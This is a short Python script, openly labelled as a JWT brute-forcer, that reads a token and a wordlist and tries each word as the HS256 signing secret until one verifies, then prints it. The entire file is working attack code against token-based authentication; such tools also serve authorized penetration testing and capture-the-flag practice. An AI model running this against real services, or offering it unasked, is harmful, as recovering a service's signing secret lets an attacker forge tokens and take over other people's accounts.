import jwt;

print("Script for bruteforcing JWT tokens")
encoded = input("JWT TOKEN: ")
passwords = input("Dictionary: ")


with open(passwords) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
            print('Token decoded the password ....[' + secret.rstrip() + ']')
            break
        except jwt.InvalidTokenError as e:
            print(e)
            print('Token Invalid .... [' + secret.rstrip() + ']')
        except jwt.ExpiredSignatureError:
            print('Token Expired ....[' + secret.rstrip() + ']')
